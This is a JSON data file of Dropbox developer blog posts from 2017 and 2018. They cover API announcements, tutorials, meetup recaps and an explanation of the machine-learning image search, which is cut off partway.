{"website": "Dropbox", "title": "New Dropbox API Getting Started Guide", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/getting-started", "abstract": "The D ropbox API allow you to manage and control content programmatically and extend Dropbox capabilities in new and creative ways. If you've ever wanted to explore the DBX Platform but didn't know where to begin, w e’ve just published a guide that will take you through the basic steps required to get up and running using the Dropbox API . Through this step-by-step tutorial, you’ll learn all about building on the DBX Platform while creat ing a simple file organization app to help sort files within your Dropbox account. This Getting Started with the Dropbox API guide is divided into three sections: 1. Creating a Dropbox app and navigating the App Console In this section, you’ll learn about the different app permission categories, how to manage your app settings, and track app analytics. 2. Working with the API documentation and API Explorer In this section, you’ll learn how to navigate and understand the documentation and begin testing endpoints to prototyp e your app 3. Writing a script for a simple expense organizer app In the final section, you’ll be designing and writing a script for a file organization app using Dropbox. Check out the full guide here and start building with the Dropbox API. Have ideas for other guides you would like to see? Let us know by posting in the Dropbox Developer Community forums . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements Guide Python // Copy link Link copied Link copied", "date": "2018-10-16"},
{"website": "Dropbox", "title": "Photo gallery tutorial with tags using the File Properties API", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/photo-gallery-tutorial-with-tags", "abstract": "In a previous blog post , we shared how to create a production-ready photo gallery application using Node.js, Express, and Dropbox, and deploy it to Heroku. In our latest tutorial , we’ve expanded this application to search for pictures on Dropbox using tags. This new tutorial uses the Microsoft Azure Face Recognition API to identify and create tags for specific people; the Dropbox File Properties API to store a reference to and handle search of those tags; and the Dropbox JavaScript SDK to implement all of this with fewer lines of code, including pagination of results to handle large numbers of files. The File Properties API , which is one of Dropbox’s newest APIs , allows developers to add property tags to Dropbox files through their third party applications. In this tutorial, we use the File Properties API to write tags that correspond to the people in each image and then search by those tags across the gallery. Check out the tutorial here to see all this in action. You can also find the full source code of the project in GitHub . Have ideas for other guides you would like to see? Let us know by posting in the Dropbox Developer Community forums . // Tags Developers Sample Apps JavaScript Tips and Tricks // Copy link Link copied Link copied", "date": "2018-09-26"},
{"website": "Dropbox", "title": "Dropbox Dev Day coming to Tel Aviv", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/dropbox-dev-day-coming-to-tel-aviv", "abstract": "We’ve hosted Dropbox Developer Meetups in San Francisco, New York City, and Seattle where we’ve met hundreds of members of our U.S. based community. Now, it’s time to take the show on the road internationally. We announced a new engineering office in Tel Aviv earlier this year, so it seemed like the perfect place to start our global tour. On Monday, August 27, we are hosting a Dropbox Dev Day in our shiny, new Tel Aviv office. The day will be split up into two major sections–a \"Getting Started\" workshop and a happy hour meetup. You are welcome to attend either or both parts of the day. In the afternoon we are hosting a “Getting Started with the Dropbox APIs” workshop . This is for developers who are less familiar with the Dropbox APIs and want some help getting their first integration off the ground. We will go through the basics of the DBX Platform, and everyone will leave having built a Dropbox app! After the workshop, we will open the office up for an evening happy hour and meetup. Whether you are a Dropbox Partner, have an existing Dropbox integration, or are just curious to learn more about the Dropbox APIs, you’re invited to attend. There will be plenty of food, swag, and fun available throughout the night as we mingle, answer questions, and share what’s new with the DBX Platform. To learn more about our past meetups, check out our blog posts recapping the San Francisco and New York City Dropbox Developer Meetups. While the Dropbox team is in town, we’re also offering office hours here you can get some hands on help with your integration. Head to the event page learn more about the Tel Aviv Dropbox Dev Day and to sign up for the workshop, meetup, and/or office hours. Follow us on Twitter to stay up to date on the latest developer news and upcoming events. Build with Dropbox today at www.dropbox.com/developers // Tags Developers Developer Community Dbx Dev Day Announcements // Copy link Link copied Link copied", "date": "2018-07-24"},
{"website": "Dropbox", "title": "Streamlining workflows with Dropbox APIs", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/developer-stories-streamlining-workflows-with-dropbox-apis", "abstract": "Smartsheet HelloSign Azuqua Workato Smartsheet, Azuqua, plus Dropbox Developer community Future events Tell us your story The DBX Platform helps bridge the silos between people and content by connecting the tools they use at work. We are excited to share the story of four developers who integrated with Dropbox to streamline workflows for their users. This year we hosted Dropbox Developer Meetups in San Francisco, Seattle, and New York to connect with and inspire our local communities of developers. At each of these events, we conducted a panel discussion with developers to learn about their integrations with Dropbox, the use cases they solve, and their experience building with the Dropbox APIs. At our New York City event, we were joined by engineers from Dow Jones and Fictive Kin, which you can read more about in an earlier blog post covering the event . Smartsheet and Azuqua spoke together at our Seattle meetup in May, and HelloSign and Workato joined us in San Francisco. Below we share more about their integrations and experiences building on the DBX Platform. Up and running in minutes Smartsheet Smartsheet , a work execution platform, first integrated with Dropbox back in 2013, using our Chooser component. Chooser is a small JavaScript component that enables your app to get files from Dropbox without having to worry about the complexities of implementing a file browser, authentication, or managing uploads and storage. Smartsheet used Chooser to allow their users to easily attach files from Dropbox, including documents, PDFs, presentations, graphic files, and videos seamlessly from the Smartsheet UI. Smartsheet Engineer, Brian Harper, highlighted the ease of integration and scale the DBX Platform provided. He described the DBX Platform as one of the easiest platforms to integrate with due to the Chooser component. “Within a matter of minutes, we had Dropbox Chooser up and running in our application.” Brian stated, “And, over the last five years, it has required no engineering time to keep it maintained on our product.” HelloSign HelloSign , a leading eSignature provider, also integrates with the DBX Platform using the Chooser component to enable users to easily select files from Dropbox to send securely for electronic signature. After the document is signed and completed, HelloSign then uses Dropbox's /files/upload endpoint along with the user’s OAuth token to asynchronously send the final document back to Dropbox, completing the workflow. Dropbox was not only simple to implement into the HelloSign homepage, it also delivered immediate value to HelloSign customers by creating a more seamless electronic signature workflow. Aron Solberg, Product Manager at HelloSign, explained that, \"Integrating with Dropbox as a content source was important to our customers who were looking to streamline their day-to-day workflows. We knew we were on the right track to delivering value in key areas when we saw a strong positive correlation between HelloSign users who activated and used the Dropbox integration and a higher-than-average customer contract amount.\" Screenshot of the Dropbox Chooser on HelloSign. Similar to the Chooser component used by Smartsheet and HelloSign to select files from Dropbox, Dropbox also offers a Saver component which allows users to easily save files back to Dropbox directly from the application. Both of these components c an be implemented in a matter of minutes with our copy-paste code. Learn more at the Chooser and Saver documentation pages. Automating common workflows Azuqua Azuqua , an integration and digital process automation platform, has connected with Dropbox since 2016. Their product helps business users integrate their applications and automate their business critical processes without code or specialized skills. Dropbox was a critical application for them to offer to their customers early on. The Azuqua team mapped over twenty Dropbox API endpoints to actions that their users can drag and drop into automated workflows. These include everything from simply creating and editing/updating a file with the /upload endpoint, to more complex user and access permissions with the /share_folder and /create_shared_link_with_settings endpoints. While on the panel at the Dropbox Developer Meetup the Azuqua team stressed the ease of use of the Dropbox APIs. Allison Amaral, Product Manager, stated, “Dropbox was one of the easier platforms we have integrated with. The documentation was clear and straightforward. Workato Workato , an integration and automation platform, built their integration with Dropbox in 2016. Workato allows their users to build \"recipes\" to incorporate many different business systems like Dropbox into automated workflows via their cloud-based platform. Their connector works with numerous Dropbox API endpoints, taking advantage of webhooks, polling, and Dropbox's core API. Example of a community recipe any Workato user can copy and use to automate their customer success Workato has over 225,000 automations publicly available. At our meetup in San Francisco, Markus Zirn, VP of Business Development at Workato, demoed a recipe which uploads attachments from Zendesk into Dropbox when a ticket is marked as closed. By leveraging Workato's out-of-the-box Connectors to the Dropbox APIs and the Zendesk APIs, he demonstrated how to create an automated workflow for CX employees in a matter of hours. Solving a joint customer need Smartsheet, Azuqua, plus Dropbox Azuqua and Smartsheet not only integrate with Dropbox, they also integrate with each other, allowing customers to seamlessly connect the three tools. We teamed up with Azuqua to develop a webinar highlighting how Aramark Corporation , a leader in food services, facilities management, and uniforms, streamlined their RFP process by connecting Dropbox, Smartsheet, Salesforce, and Azuqua. When changes are made to a RFP in Salesforce, the changes are automatically updated by Azuqua in Smartsheet. Then, when a user marks a task as complete in Smartsheet, the file is automatically saved in Dropbox and all details are logged in Salesforce. Aramark saw immediate and positive impact from automating their RFP process, resulting in three hours saved per RFP, and over 40 hours saved per week. Example of how a customer uses Azuqua to connect Dropbox, SFDC, and Smartsheet to complete an RFP process workflow. Developer community These panel discussions highlighting example solutions were one of many discussions at the San Francisco and Seattle Dropbox Developer Meetups. We also shared our vision for the DBX Platform, focus areas for the Dropbox team, and the latest updates to the APIs, including a deep dive into the new team events APIs . If you aren’t familiar with the Dropbox APIs, you can learn more on our developer website or by attending future events. Future events Our next developer event is in Tel Aviv on August 27. The event will consist of a workshop to build your first app, an overview of what's new with the DBX Platform, and a panel discussion with local partners. Learn more about the Tel Aviv DBX Dev Day on the event page . Future event dates in new locations will be announced soon. Subscribe to this blog and follow us on Twitter to get the latest DBX Platform news and updates. Tell us your story Are you solving a unique problem for your users with the Dropbox APIs? We love hearing stories from our developers, so let us know . Who knows? Your app could even be our next featured story on the blog. Build with Dropbox today at www.dropbox.com/developers // Tags Developers Dbx Dev Day Workflow Components Developer Community Developer Spotlight Files Partners // Copy link Link copied Link copied", "date": "2018-08-09"},
{"website": "Dropbox", "title": "Dropbox Developer Community, and the new DBX Platform Super User Program!", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/dropbox-developer-community-and-dbx-platform-super-user-program", "abstract": "There are over 500,000 developers on the DBX Platform who have built integrations with Dropbox. With so many creative and experienced engineers developing on our platform, we’re investing in enabling the Dropbox Developer Community to connect, ideate, create, and get support among peers through meetups and online forums. Meetups Dropbox Developer Meetups bring users of the DBX Platform together in person to connect with the Dropbox team, hear what's new from Dropbox, and learn from one another. The events in San Francisco and New York City are recapped on the blog if you're interested in learning more. We plan to continue hosting these events in our offices around the world. Please let us know where you think we should come next by filling out this form , and stay tuned to the blog and @dropboxapi Twitter for meetup announcements. Developers & API Forum The Developers and API forum is a space where you can ask questions, get advice, brainstorm ideas, make connections, and get inspired. You can head directly to the API Support & Feedback page within the forum to get technical support from the Dropbox team and community about specific API issues, as well as to provide product feedback and feature requests to us. For everything else, from catching up on Dropbox’s latest API announcements, to sharing code samples, to brainstorming your start up ideas, to getting tips on how to best build your app, head to the newly added General Discussion page. We encourage all our developers to engage in the conversations and contribute content that will help other members of the community. Read more about the Dropbox Developer Community on the forum . DBX Platform Super User Program As part of this continued investment in community, we are excited to launch our new DBX Platform Super User Program . We are looking for our most passionate API users to share their expertise with the Dropbox Developer Community. This program will provide benefits to those community members who go above and beyond by regularly contributing high-value content on the Developers and API forum such as code samples, details on projects they have completed, answers to other member questions, and/or guides with tips & tricks they have learned along the way. In exchange for contributing to the Dropbox Developer Community, the DBX Platform Super Users will get perks and incentives that grow over time with the level of their investment like additional Dropbox space, swag, specialized training, early access content, and direct access to the Dropbox team. All the details about the DBX Platform Super User Program, including the expectations and benefits, are outlined in the forum announcement . If you have any feedback or questions about the program, feel free to reply to the forum post. To apply to be a DBX Platform Super User, please fill out this form . The Dropbox team will review all applications and follow up with any additional questions. Whether it’s at an upcoming meetup or on the forum, we hope to meet you soon! // Tags Developers Developer Community Announcements // Copy link Link copied Link copied", "date": "2018-05-16"},
{"website": "Dropbox", "title": "New team events API available now", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/new-team-events-api-available-now", "abstract": "Developers building for Dropbox Business can now use the new team events API to power their workflow and analytic applications. Dropbox Business provides an activity log that records all of the key events taken on a team. An admin on a Business team can use the events in the Admin Console to audit and monitor activity within the team. We have re-written the corresponding API from the ground-up with over 300 events available . The new v2 API ( team_log/get_events ) improves upon its v1 predecessor with a rich schema, new attributes, and detailed per-event documentation that makes it easy to work with all event types. Developers can use the team events API to power a variety of applications, includ ing: Real-time workflow applications, which poll the endpoint looking for particular events to initiate actions Security information and event management (SIEM) applications, which look for anomalies or policy violations and send alert s Business Intelligence tools, which aggregate events and provide insight into how the team works and collaborates If you’re interested in building with the team events API or want to learn more, we’d love to hear what you’re thinking and talk through the use case you’re trying to solve. Post in the developer forum to get the conversation started. If you previously built an application using the v1 /team/log/get_events , we’ve written a migration guide to help you move your apps onto v2 team_log/get_events . Need help with anything else? You can contact us here . // Tags Developers Announcements Business Endpoints Team Log // Copy link Link copied Link copied", "date": "2018-05-08"},
{"website": "Dropbox", "title": "NYC meetup recap, and details for our next event", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/nyc-meetup-recap-and-details-for-our-next-event", "abstract": "Back in December, we hosted our first developer meetup in San Francisco since the launch of our new DBX Platform . We continued that momentum in January with a meetup in New York. We had over 100 developers RSVP for the event and came close to hitting our capacity in our NYC office. While sufficiently stuffed full of pizza and Momofuku cookies, we had in depth discussions on what’s possible with the DBX Platform. We were joined by engineers from Dow Jones and Fictive Kin to talk about how they have used the Dropbox APIs. Dow Jones built a new internal document management workflow with Dropbox as the collaboration and EFSS layer. Fictive Kin, an engineering and design studio, brought a new product to market, Folder.Market , built on the premise of making money off digital assets stored in Dropbox. While vastly different use cases, their work shows the power and breadth of the DBX Platform. As part of the developer panel, Tina Schuchman, Dropbox Ecosystem Engineering Lead, shares her home hacks Welcome to the Dropbox NYC Office Interactive Roadmap feedback boards Chuck Hirstius, Dropbox Platform Evangelist, providing tips to a developer JJ Kass, Dropbox Developer Programs, shares 2018 focus areas From internal workflows founded on functionality and security to external product launches targeting the design community, we hope sharing these stories ignites your creativity to think about new use cases with Dropbox. This is one of the many reasons we want to continue hosting developer meetups around the world. We asked you where you would like us to host our next meetup, and, out of twelve cities, Seattle was the most requested. So, we’re excited to announce that’s where we are bringing our next developer meetup! Join us on Thursday, May 3rd in our Seattle office for what is sure to be a great evening. We will be discussing Team Spaces , the Events API , and provide a preview of some of the things we are working on. We also have two of our Seattle-based partners, Smartsheet and Azuqua , joining us for a panel discussion. As with all of our developer events, Dropbox engineers, product managers, and partner managers will be attending to listen to feedback, answer questions, give tours of our office, and get to know you. Check out the Dropbox Seattle Developer Meetup event page to learn more and reserve your spot. RSVP HERE Not located in Seattle? Please continue to let us know where you think we should host future events by filling out this form . Austin, Tokyo, London, Denver, Tel Aviv, Sydney… you tell us! We hope to see you at a Dropbox Developer Meetup soon! Build with Dropbox today at www.dropbox.com/developers // Tags Developers Dbx Dev Day Partners Developer Community Nyc // Copy link Link copied Link copied", "date": "2018-04-09"},
{"website": "Dropbox", "title": "Build Dropbox and Zapier into your development workflow", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/build-dropbox-and-zapier-into-your-development-workflow", "abstract": "As a developer, automating your busywork is important. When it comes to collaborating with other teams or moving files around various systems, a little code can help you—and your teammates—focus on the tasks that matter. Dropbox is all about simplifying the way you work, which is why we teamed up with our friends at Zapier to pull together some ways they can help you automate your development with Dropbox. Here are three Zapier automations for Dropbox with S3, Github, and more so you can optimize workflows and put your creative energy to work. Easily deploy Dropbox files to Amazon S3 buckets Developers are frequently automating their own workflows, but you don’t have to stop at the work you do. If you’re working on a website or project with images and static assets, help designers and copywriters stick to the tools with which they’re familiar, like Dropbox.Let’s say a client asks for their logo in an illustration to be bigger on their website. With the source file, that’s a quick change, but your static assets are likely stored in Amazon S3 or a similar tool built for developers. By build i ng an automation with Dropbox, you can enable your designer to save the new image file into Dropbox and be done. The file will automatically copied to an Amazon S3 bucket. Automatically create GitHub pull requests for file revisions You probably spend a lot of time on GitHub, so it’s easy to forget that’s not true for everyone. There are good reasons why development teams run their work through version control services. It’s a single source of truth, and a place to see and discuss changes. However, it can be challenging keeping tabs on content changes when collaborating with teammates using different tools. Take a content team, used to writing in a word processor and collaborating within a document saved in Dropbox. When their revisions need to be incorporated, rather than creating manual updates, you can leverage this Dropbox-GitHub Zap to automatically make a pull request when a new file is added to a Dropbox folder. This allows your entire team to stay on the same page without anyone being pulled out of their workflow. Wire file updates to any URL You may have special requirements in your deployment process that prevent you from storing files in Amazon S3 or GitHub PRs. In that case, you likely have orchestration in your codebase that you’ll tap into. You can wire up new file notifications from Dropbox directly using webhooks or through the Zapier-Dropbox integration . This Zapier integration sends the Dropbox filename, download URL, and other details to an endpoint that can handle it for you. You can post the Dropbox file URL to your server, or send the whole file for storage in your database or other server-side solution. When you set up these automations, we recommend you double check that you have 2FA enabled for both your Dropbox and Zapier accounts for added security. With the Dropbox API you can connect your most important work and tools to create meaningful workflows. And with the workflow automations enabled by Dropbox’s partner, Zapier, you can find a more enlightened way of working with Dropbox. Build with Dropbox today at www.dropbox.com/developers // Tags Developers Workflow Partners Automation Developer Spotlight // Copy link Link copied Link copied", "date": "2018-03-12"},
{"website": "Dropbox", "title": "New API enhancements to support Team Spaces", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/new-api-enhancements-to-support-team-spaces", "abstract": "Customers turn to Dropbox Business because they want a single, central place to store their team's content. Today, individual users can share content amongst themselves and admins can publish content into select folders. But, we know that a lot of teams would value a coherent, shared collaborative space. We are beginning to roll out the release of a team-centric Dropbox Business model that introduces a shared collaborative space called Team Spaces . Dropbox Business accounts with Team Spaces will have unified shared space for all team members, where users can add and remove access for individuals or groups anywhere in the filesystem. Note that the Team Spaces feature will be rolled out over time on a per-team basis . If you are a developer running an application used by teams , these changes may impact your integrations with Dropbox. The primary difference is the introduction of the path root , which serves as the entry point to all content available to the user. An app that is not updated for path root will continue to function without error, but will not be aware of content available in the new shared workspace. The new Dropbox-API-Path-Root header allows developers to suppor t both current teams & new teams with team space with minimal code change. See our new Namespace Guide for additional details on Dropbox-API-Path-Root . Additionally , shared folders within Team Space now allows for finer grain permission control through the new set_access_inheritence call and sharing_info metadata. If you have any questions, you can always reach us on our forum or via our contact form . // Tags Developers Announcements Teams // Copy link Link copied Link copied", "date": "2018-02-09"},
{"website": "Dropbox", "title": "Node Photo Gallery Tutorial", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/node-photo-gallery-tutorial", "abstract": "We recently published a tutorial on how to build a production-ready photo gallery web service using Node.JS and Dropbox. In the step-by-step guide, you’ll learn about all the technologies required to implement a web service that will allow you to nicely display images stored in your Dropbox account in a photo gallery.  We cover topics such as authentication to Dropbox via OAuth, app folder access Dropbox permissions, photo rendering using a JavaScript library called Galleria, and code deployment on Heroku for production. Click here to check out the full ten-step tutorial on Github to get started. Have ideas for other guides you would like to see? Let us know by posting to the API Support forum . // Tags Developers Sample Apps JavaScript Tips and Tricks // Copy link Link copied Link copied", "date": "2018-02-02"},
{"website": "Dropbox", "title": "Updates to our Developer Terms and Conditions ", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/developer-terms", "abstract": "Since launching our new DBX Platform , we’ve been working to improve your developer experience. As we continue revamping our developer programs, we’re also making a few updates to our Terms and Conditions. Here’s a summary of the key additions and changes: Enhanced security terms . We’ve updated our security requirements to ensure you ’ re protect ing the Dropbox user data that you r applications access through the DBX Platform. Confidentiality . We might exchange confidential information with each other , so we’ve added a clause to safeguard any sensitive information that we each disclose. Arbitration . We’re adding an arbitration clause to our agreement with you. Arbitration is a faster and more efficient way to resolve legal disputes, and it provides a good alternative to things like state or federal courts, where the process could take months or even years. If you prefer to opt out of arbitration, just email developer-terms-opt-out@dropbox.com as explained in the new terms . For more detail, you can read the full Developer Terms and Conditions , which will go into effect on February 15, 2018 . We’ve emailed registered developers these updates as well . If you have any questions, you can always reach us on our forum or via our contact form . For any broader feedback about your experience with the DBX Platform, we welcome you to fill out our developer survey . // Tags Developers Developer Community Announcements // Copy link Link copied Link copied", "date": "2018-01-16"},
{"website": "Dropbox", "title": "SF developer meetup recap, and upcoming events", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/developer-meetup", "abstract": "In December Dropbox hosted a developer meetup at our San Francisco HQ. We had such a good time that we’ve already scheduled our next event for later this month in New York City. Today we wanted to share some of the fun from the SF meetup with you. Developer meetup hosted in Dropbox’s coffee shop, little r, and catered by the Dropbox Tuck Shop. Of course, there was endless food and refreshments provided by the Dropbox Tuck Shop. Everyone received tours of our HQ and new swag (some of the first since our brand redesign ). Ross Piper, Dropbox’s Product Head of Ecosystem and Developer Platform, gave a presentation outlining the vision for the DBX Platform, and several members of the Dropbox Engineering team participated in a panel showing off their work with our APIs. Ross Piper, Product Head of Ecosystem and Developer Platform, presenting DBX Platform focus areas Dropbox panel with JJ Kass, Head of Developer Programs, Tina Schuchman, Engineering Head of Ecosystem, Daniel Phan, Partner Platform Engineer, and Daniel Millen, Strategic Integrations Engineer Throughout the evening developers provided the Dropbox team with a lot of valuable feedback on where we should focus in 2018 and got into deep conversations about their integrations and use cases. Some key takeaways from these discussions were: (1) The productivity landscape is evolving fast and developers are unlocking new use cases; (2) Almost all apps contain file storing, sharing, and collaboration functionality for their users— which require a wide range of features on the backend that can be difficult to develop; and (3) compliance and governance are increasingly important for nearly all apps. We also heard many stories of developers who have been able to accelerate development time and scale by having the Dropbox APIs manage the heavy-lifting of their apps. Thanks to all the developers who attended our San Francisco event—we hope you enjoyed yourselves as much as we did! Interested in attending a future Dropbox Developer Meetup? Our next meetup will be at the Dropbox office in New York City on January 30, 2018. Visit the event page to get more information and RSVP. You can also let us know where you think we should host future events by filling out this form . We look forward to meeting you soon! Build with Dropbox Swag Gathering feedback on our 2018 roadmap Great conversations happening throughout the evening Dropboxers and developers discuss 2018 focus areas Appetizers provided by the Tuck Shop before the pizza dinner Build with Dropbox today at www.dropbox.com/developers // Tags Developers Developer Community Dbx Dev Day // Copy link Link copied Link copied", "date": "2018-01-03"},
{"website": "Dropbox", "title": "We want to hear from you!", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/survey", "abstract": "Back in September, we announced our new DBX Platform , a unified suite of APIs and tools for developers. The updates we shared were just the beginning of the improvements we’re working on for our community. We’re quickly ramping up our efforts and hiring several new team members across product, engineering, design, and programs. As we plan for the future, we'd love to hear how you’re using the DBX Platform today and what we can do to improve your experience. Your feedback is incredibly important to us as we plan our roadmap . Take the survey If you have any additional questions, you can always reach us on our forum or via our contact form . We look forward to hearing from you! // Tags Developers Feedback // Copy link Link copied Link copied", "date": "2017-12-12"},
{"website": "Dropbox", "title": "DBX Platform launches with three new APIs", "author": ["Robdbx"], "link": "https://dropbox.tech/developers/dbx-platform-launches-with-three-new-apis", "abstract": "Earlier today we announced the launch of our new DBX Platform , a unified suite of APIs and tools for developers. Since launching our first API in 2008, Dropbox has enabled over 500,000 developers to build connections to leading applications and tools. With your success, the platform has reached a scale of more than 2 billion API calls per day—and we’re just getting started. Over the past year, we quadrupled our API endpoints and we’re going even further today with the launch of three more APIs into general availability: The File Properties API, which includes the newly released File Properties endpoints, lets developers assign custom metadata labels and values to Dropbox files through their third party applications. Since we initially released File Properties in a preview state, we have made some changes and added new endpoints, including one to search the properties your application has added to files. We have also expanded permissions so that User and Team applications can create templates. Documentation is available here for File Properties user endpoints and here for File Properties business endpoints. The File Requests API lets developers automate the creation of file requests and embed requests into other workflows. This new endpoint expands a widely used Dropbox feature that allows users to collect files and images from others through a simple link, even if the person uploading doesn’t have a Dropbox account. The endpoints allow you to create a request, list the requests, and update a request. Full documentation is available on the developer website. The Paper API lets developers build Paper integrations directly into third-party applications, with create and edit functionality. For additional information please refer to the documentation on the developer website. Dropbox is also planning UI, performance, and feature enhancements to our Chooser and Saver Drop-ins later this year. And by the end of 2017, we’ll be doubling the size of our ecosystem team, hiring new talent in Engineering, Product, Developer Relations, Marketing, and Business Development to keep the momentum growing. This is just the beginning of a series of updates and improvements for our developers. We are excited to continue building with you! If you have any questions or feedback, please don’t hesitate to reach out or find us on our forum . // Tags Developers Announcements File Properties Paper File Requests // Copy link Link copied Link copied", "date": "2017-09-20"},
{"website": "Dropbox", "title": "API v1 Shutdown Details", "author": ["Robdbx"], "link": "https://dropbox.tech/developers/api-v1-shutdown-details", "abstract": "As previously announced , API v1 is being retired on Thursday, September 28th, 2017. On this date, API v1 endpoints will return a 400 error with this message: {\"error\": \"v1_retired\"} . This means any integrations or applications still relying on API v1 endpoints may stop working. If you still have not migrated to v2, check out the migration guide for more details. We built API v2 to create a more consistent, simplified, and scalable platform for developers, and we appreciate your patience and flexibility as we make this transition. We’re continually working to improve your experience developing on the DBX Platform. Feel free to reach out via our contact form or forum if you have any questions or feedback. // Tags Developers Announcements // Copy link Link copied Link copied", "date": "2017-09-26"},
{"website": "Dropbox", "title": "How image search works at Dropbox", "author": ["Thomas Berg"], "link": "https://dropbox.tech/machine-learning/how-image-search-works-at-dropbox", "abstract": "Our approach An example Production architecture Current deployment Photos are among the most common types of files in Dropbox, but searching for them by filename is even less productive than it is for text-based files.  When you're looking for that photo from a picnic a few years ago, you surely don't remember that the filename set by your camera was 2017-07-04 12.37.54.jpg . Instead, you look at individual photos, or thumbnails of them, and try to identify objects or aspects that match what you’re searching for—whether that’s to recover a photo you’ve stored, or perhaps discover the perfect shot for a new campaign in your company’s archives.  Wouldn’t it be great if Dropbox could pore through all those images for you instead, and call out those which best match a few descriptive words that you dictated? That’s pretty much what our image search does. Image content search results for “picnic” In this post we’ll describe the core idea behind our image content search method, based on techniques from machine learning, then discuss how we built a performant implementation on Dropbox’s existing search infrastructure. Our approach Here’s a simple way to state the image search problem: find a relevance function that takes a (text) query q and an image j , and returns a relevance score s indicating how well the image matches the query. s = f(q, j) Given this function, when a user does a search we run it on all their images and return those that produce a score above a threshold, sorted by their scores.  We build this function using two key developments in machine learning: accurate image classification and word vectors . Image classification An image classifier reads an image and outputs a scored list of categories that describe its contents. Higher scores indicate a higher probability that the image belongs to that category. Categories can be: specific objects in the image, such as tree or person overall scene descriptors like outdoors or wedding characteristics of the image itself, such as black-and-white or close-up The past decade has seen tremendous progress in image classification using convolutional neural networks, beginning with Krizhevsky et al ’s breakthrough result on the ImageNet challenge in 2012. Since then, with model architecture improvements, better training methods, large datasets like Open Images or ImageNet , and easy-to-use libraries like TensorFlow and PyTorch , researchers have built image classifiers that can recognize thousands of categories. Take a look at how well image classification works today: Image classifier outputs for a typical unstaged photo Image classification lets us automatically understand what’s in an image, but by itself this isn’t enough to enable search. Sure, if a user searches for beach we could return the images with the highest scores for that category, but what if they instead search for shore ? What if instead of apple they search for fruit or granny smith ? We could collate a large dictionary of synonyms and near-synonyms and hierarchical relationships between words, but this quickly becomes unwieldy, especially if we support multiple languages. Word vectors So let’s reframe the problem. We can interpret the output of the image classifier as a vector j c of the per-category scores. This vector represents the content of the image as a point in C -dimensional category space, where C is the number of categories (several thousand). If we can extract a meaningful representation of the query in this space, we can interpret how close the image vector is to the query vector as a measure of how well the image matches the query. Fortunately, extracting vector representations of text is the focus of a great deal of research in natural language processing. One of the best known methods in this area is described in Mikolov et al’s 2013 word2vec paper. Word2vec assigns a vector to each word in the dictionary, such that words with similar meanings will have vectors that are close to each other. These vectors are in a d -dimensional word vector space, where d is typically a few hundred. We can get a vector representation of a search query simply by looking up its word2vec vector. This vector is not in the category space of the image classifier vectors, but we can transform it into category space by referencing the names of the image categories as follows: For query word q , get the d -dimensional word vector q w , normalized to a unit vector. We’ll use a w subscript for vectors in word space and a c subscript for vectors in category space. For each category, get the normalized word vector for the category name c i w . Then define m̂ i = q w · c i w , the cosine similarity between the query vector and the i -th category vector. This score between -1 and 1 indicates how well the query word matches the category name. By clipping negative values to zero, so that m i = max(0, m̂ i ), we get a score in the same range as the image classifier outputs. This lets us calculate q c = [ m 1 m 2 ... m C ], a vector in the C -dimensional category space which represents how well the query matches each category, just as the image classifier vector for each image represents how well the image matches each category. Step 3 is just a vector-matrix multiplication, q c = q w C , where C is the matrix whose columns are the category word vectors c i w . Once we've mapped the query to category space vector q c , we can take its cosine similarity with the category space vector for each image to get a final relevance score for the image, s = q c j c . This is our relevance function, and we rank images by this score to show the results of the query. Application of this function to a set of images can also be expressed as a vector-matrix multiplication, s = q c J , where each column of J is the classifier output vector j c for an image and s is the vector of relevance scores for all images. An example Let’s go through an example with only a few dimensions, where word vectors have only three dimensions and the classifier has only four categories: apple , beach , blanket , and dog . Suppose a user has searched for shore.  We look up the word vector to get [0.35 -0.62 0.70], then multiply by the matrix of category word vectors to project the query into category space. Because the shore word vector is close to the beach word vector, this projection has a large value in the beach category. Projecting a query word vector into category space Modeling details Our image classifier is an EfficientNet network trained on the OpenImages dataset .  It produces scores for about 8500 categories.  We’ve found that this architecture and dataset give good accuracy at a reasonable cost, which matters if we want to serve a Dropbox-sized customer base. We use TensorFlow to train and run the model.  We use the pre-trained ConceptNet Numberbatch word vectors. These give good results, and importantly to us they support multiple languages, returning similar vectors for words in different languages with similar meanings.  This makes supporting image content search in multiple languages easy: word vectors for dog in English and chien in French are similar, so we can support search in both languages without having to perform an explicit translation. For multi-word searches, we parse the query as an AND of the individual words.  We also maintain a list of multi-word terms like beach ball that can be considered as single words.  When a query contains one of these terms we do an alternate parse and run the OR of the two parsed queries—the query beach ball becomes (beach AND ball) OR (beach ball) . This will match both large, colorful, inflatable balls and tennis balls in the sand. Production architecture It’s not practical to fetch a full, up-to-date J matrix whenever a user does a search.  A user may have access to hundreds of thousands or even millions of images, and our classifier outputs are thousands of dimensions, so this matrix could have billions of entries and needs to be updated whenever a user adds, deletes, or modifies an image. This simply won’t scale affordably (yet) for hundreds of millions of users. So instead of instantiating J for each query, we use an approximation of the method described above, one which can be implemented efficiently on Dropbox’s Nautilus search engine. Conceptually, Nautilus consists of a forward index that maps each file to some metadata (e.g. the filename) and the full text of the file, and an inverted index that maps each word to a posting list of all the files that contain the word. For text-based search, the index content for a few recipe files might look something like this: Search index contents for text-based search If a user searches for white wine , we look up the two words in the inverted index and find that doc_1 and doc_2 have both words, so we should include them in the search results. Doc_3 has only one of the words, so we should either leave it out or put it last in the results list. Once we've found all the documents we may want to return, we look them up in the forward index and use the information there to rank and filter them. In this case, we might rank doc_1 higher than doc_2 because the two words occur right next to each other. Repurposing text search methods for image search We can use this same system to implement our image search algorithm.  In the forward index, we can store the category space vector j c of each image.  In the inverted index, for each category, we store a posting list of images with positive scores for that category. Search index contents for image content search So, when a user searches for picnic : Look up the word vector q w for picnic and multiply by the category space projection matrix C to get q c as described above. C is a fixed matrix that’s the same for all users, so we can hold it in memory. For each category with a nonzero entry in q c , fetch the posting list from the inverted index. The union of these lists is the search result set of matching images, but these results still need to be ranked. For each search result, fetch the category space vector j c from the forward index and multiply by q c to get the 